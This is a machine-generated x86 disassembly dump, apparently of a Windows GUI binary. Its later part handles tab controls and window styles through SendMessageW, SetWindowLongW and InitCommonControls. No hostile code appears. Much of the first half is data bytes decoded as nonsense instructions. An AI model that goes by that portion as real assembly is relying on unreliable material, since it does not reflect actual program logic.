add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47110035 ] al
jb r-xdata
or [ edx + 0x6f ] edx
jne r-xdata
jb r-xdata
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
ja r-xdata
dec eax
popad
jb r-xdata
add [ eax + edx * 2 ] dl
popad
jb r-xdata
push esi
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
adc al 0x50
add bh bh
pushfd
loopne r-xdata
outsb
je r-xdata
outsb
insb
jns r-xdata
insd
popad
jae r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ ecx ] cl
push edx
outsd
push esi
inc esp
add dl dl
add al [ eax ]
jmp [ eax ]
add [ ecx ] cl
inc edi
jb r-xdata
push esi
inc esp
add ah ah
add eax [ eax ]
jmp [ ecx + ebx * 8 ]
push 0x6948776f
outsb
je r-xdata
jo r-xdata
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ eax + 0x1 ] al
outsb
add [ eax ] al
cmp [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jne r-xdata
push 0x6f43776f
ja r-xdata
outsb
jne r-xdata
add [ ecx ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
or edx [ ebx + 0x6d ]
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
outsb
dec eax
popad
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
cmp eax 0x61500e00
dec eax
outsb
je r-xdata
add [ edx ] bl
add bh bh
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
push esi
imul esp [ ebp + 0x77 ] r-xdata
outsb
add al [ eax ]
jmp eax
add bh bh
add dl 0x4a
outsd
jb r-xdata
add [ ecx ] dl
push ebx
aas
push esi
inc esp
add [ ebx - 0x1f00fffe ] cl
movsb [ edi ] [ esi ]
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
jb r-xdata
cli
dec ecx
add [ ecx - 0x7f00fffe ] cl
retn 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ 0x776f6853 ] cl
push edi
sbb [ esi + 0x44 ] dl
add ah dh
add al [ eax ]
dec [ eax + 0x1004ad7 ]
jb r-xdata
add [ esi ] cl
push eax
popad
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
cmp al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
outsd
insb
outsd
add al [ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
insb
jne r-xdata
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x5009003e ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insd
movsb [ edi ] gs : [ esi ]
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
je r-xdata
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ eax ] cl
push ebx
outsd
dec edx
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080041 ] al
sub_4a27df
inc esp
add [ eax + 0x2 ] bh
add bh bh
or ah al
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b0042 ] al
insd
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
jb r-xdata
cli
dec ecx
add [ ecx - 0x7f00fffe ] cl
retn 0x4a
add al [ eax ]
push esp
jns r-xdata
insd
movsb [ edi ] gs : [ esi ]
sub_4a3028
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x31
dec edx
add [ eax + eax ] ch
add [ eax ] al
sbb [ ebx - 0x7d93ffba ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeec0042 0x49
sub_4a308e
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_4a3097
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add ah cl
adc eax [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
sub_4a30c4
adc [ eax * 2 + 0x48cb5400 ] 0x0
mov [ eax * 2 + 0x48cb7800 ] dl
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_4a3144
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ecx + edx * 2 ] ch
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add al cl
fimul [ edx ]
add al 0xa5
inc esi
add [ edx + edx * 2 + 0x42 ] bl
add ah dl
fisttp [ edx ]
test bh bl
dec edx
add al cl
movsb [ edi ] [ esi ]
inc esi
add [ edi + ebx * 8 ] bl
dec edx
add [ eax - 0x21 ] dl
dec edx
add [ edi + ebx * 8 - 0x200fffb6 ] ah
dec edx
add [ eax ] cl
dec edx
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
xor [ edx ] ecx
sub al 0x0
add [ eax ] al
cwde
xchg esp eax
inc esi
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
outsb
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] ah
xor ecx [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x33
out dx eax
inc esp
add [ eax ] ah
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
insd
nop
nop
nop
loopne r-xdata
jbe r-xdata
inc esi
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esi + edx * 4 + 0x46 ] bh
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
dec edx
add [ edi ] al
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add ah dl
push edi
inc edx
add [ eax - 0x59 ] ah
inc esi
add [ esp + edx * 2 ] bl
je r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
dec edx
add ah ch
insb
jae r-xdata
xor al 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] cl
inc esp
dec edx
add [ eax + eax ] ch
add [ eax ] al
jl r-xdata
and [ ebx ] dh
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi ] cl
insd
popad
dec ecx
outsb
js r-xdata
inc esp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
cwde
xor [ edx ] ecx
inc eax
xchg ebp eax
inc esi
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
add [ ebx + esi + 0x4a ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xor al 0x4a
add [ eax ] ch
add [ eax ] al
add ah bl
dec ebx
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
je r-xdata
push ebx
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ ebx + edx * 2 + 0x42 ] dh
add [ eax ] bl
pop eax
inc edx
add [ eax + ebx * 2 ] bl
inc edx
add al ch
loopne r-xdata
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x8004481
out dx eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
nop
nop
fdiv [ edx ]
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
out dx eax
dec edx
add [ eax - 0x17ffbdb2 ] dl
pop edx
inc edx
add [ ecx + ebx * 2 - 0xf4fffbe ] bh
dec edx
add ah dl
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x20004481
insd
jae r-xdata
inc esp
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ esi + edx * 2 + 0x44 ] ch
nop
and [ ebx ] dh
dec edx
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
je r-xdata
je r-xdata
inc edx
add [ eax - 0x2bffbdac ] bl
movsd [ edi ] [ esi ]
inc esi
add [ eax + 0x580046a8 ] dl
sbb al 0x54
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] ah
insd
jae r-xdata
loope r-xdata
pop eax
xor cl [ edx ]
sbb [ edi + 0x30046 ] dl
sub_4a322e
add dh bh
add [ eax ] eax
add [ eax ] al
je r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
inc esp
and [ ebx ] dh
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi ] cl
insd
popad
dec ecx
outsb
js r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add ah dl
push edi
inc edx
add [ eax - 0x59 ] ah
inc esi
add [ esp + edx * 2 ] bl
jbe r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] cl
inc esi
push ebx
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ ebx + edx * 2 + 0x42 ] dh
add [ eax ] bl
pop eax
inc edx
add [ eax + ebx * 2 ] bl
inc edx
add al ch
loopne r-xdata
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x8004481
out dx eax
inc esp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
dec edx
add ah ch
insb
jae r-xdata
xor al 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esi + edx * 4 + 0x46 ] bh
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec edx
add [ eax + eax ] ch
add [ eax ] al
jl r-xdata
nop
nop
fdiv [ edx ]
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xor ecx [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x33
add [ ebx + esi + 0x4a ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xor al 0x4a
add [ eax ] ch
add [ eax ] al
add ah bl
dec ebx
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
je r-xdata
out dx eax
dec edx
add [ eax - 0x17ffbdb2 ] dl
pop edx
inc edx
add [ ecx + ebx * 2 - 0xf4fffbe ] bh
dec edx
add ah dl
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x20004481
insd
jae r-xdata
nop
and [ ebx ] dh
dec edx
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
je r-xdata
je r-xdata
inc edx
add [ eax - 0x2bffbdac ] bl
movsd [ edi ] [ esi ]
inc esi
add [ eax + 0x580046a8 ] dl
sbb al 0x54
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] ah
insd
jae r-xdata
loope r-xdata
pop eax
xor cl [ edx ]
sbb [ edi + 0x30046 ] dl
sub_4a34ba
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xf0004481
dec cx
add ah ah
into
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ edi + eax * 8 + 0x45 ] ah
add [ eax - 0x1a ] bl
dec edx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
push esp
mov esp 0xec200045
add [ eax + 0x40048e1 ] bl
loopne r-xdata
jecxz r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add al dh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] dh
jecxz r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov ebp 0xbd2c0045
inc ebp
add [ eax + 0x280045ca ] bl
mov esp 0xc96c0045
inc ebp
add [ eax - 0x37 ] bh
inc ebp
add [ edx + ecx * 8 ] al
inc ebp
add [ eax ] dh
0x45
dec edx
add [ esi ] cl
dec edx
add al ah
into
dec eax
add al bl
or cl [ ecx ]
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al cl
in al 0x4a
add al al
sub [ ecx ] ecx
test al 0xe7
dec edx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + edi * 4 + 0x45 ] dl
add [ eax ] ah
in al dx
push eax
dec ecx
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44a7e1b
jle r-xdata
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
sub_4a35d2
dec ecx
add [ eax - 0x44 ] bh
inc ebp
add [ eax + ecx * 8 - 0x3f8bffbb ] cl
inc ebp
add [ eax + 0x40045be ] dl
jmp r-xdata
jmp r-xdata
jae r-xdata
add al bl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c004a37 ] cl
add [ eax ] al
add [ eax ] bl
mov [ 0xffffffff826c0046 ] eax
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeec0042 0x49
sub_4a36ea
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_4a36f3
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add ah cl
adc eax [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
sub_4a3720
adc [ eax * 2 + 0x48cb5400 ] 0x0
mov [ eax * 2 + 0x48cb7800 ] dl
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_4a3762
dec eax
add [ ebx + ecx * 8 - 0x3327ffb8 ] bl
dec eax
add ah ah
mov cl 0x46
add [ eax - 0x4e ] ch
inc esi
add al bh
mov cl 0x46
add ah dl
mov dl 0x46
add [ esp + esi * 4 + 0x46 ] bl
add [ eax ] ah
hlt
sub_4a37c8
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_41f8e0
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_4a37f4
push ebx
mov ebx eax
mov eax ebx
call sub_4a37c8
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_4a381c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_496c14
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_496868
push eax
call GetWindowLongW
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_496868
push eax
call SetWindowLongW
sub_4a3998
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4a39fc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x1309
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
call sub_4a47ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3a03
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x4 ]
call sub_4a3980
sub_4a3a08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3a94
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push esi
push 0x1308
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
call sub_4a47ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3a9b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_436540
mov eax [ ebp - 0x4 ]
call sub_4a3980
sub_4a3aa4
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2020 ] ebx
mov [ ebp - 0x2024 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3b98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
call sub_48e6b4
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x201c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1000
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x133c
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
mov eax edi
lea edx [ ebp - 0x201c ]
mov ecx 0x1000
call sub_449f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3b9f
lea eax [ ebp - 0x2024 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x2020 ]
push eax
lea edx [ ebp - 0x2024 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x2024 ]
mov [ ebp - 0x202c ] esi
mov [ ebp - 0x2028 ] 0x0
lea edx [ ebp - 0x202c ]
xor ecx ecx
call sub_436540
mov eax [ ebp - 0x2020 ]
call sub_4a3980
sub_4a3bc4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3c54
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1c ] 0x8
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x133c
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3c5b
lea eax [ ebp - 0x24 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] 0x0
lea edx [ ebp - 0x2c ]
xor ecx ecx
call sub_436540
mov eax [ ebp - 0x20 ]
call sub_4a3980
sub_4a3c64
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3d36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
call sub_48e6b4
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax edi
call sub_449db8
mov [ ebp - 0x10 ] eax
mov edx esi
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x1c ]
call sub_496868
mov ecx esi
mov edx 0x133d
call sub_41f0dc
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
call sub_4a47ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3d3d
lea eax [ ebp - 0x24 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] 0x11
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] 0x0
lea edx [ ebp - 0x34 ]
mov ecx 0x1
pop eax
call sub_436540
mov eax [ ebp - 0x20 ]
call sub_4a3980
sub_4a3d44
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3dd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1c ] 0x8
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x133d
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3ddb
lea eax [ ebp - 0x24 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_44be28
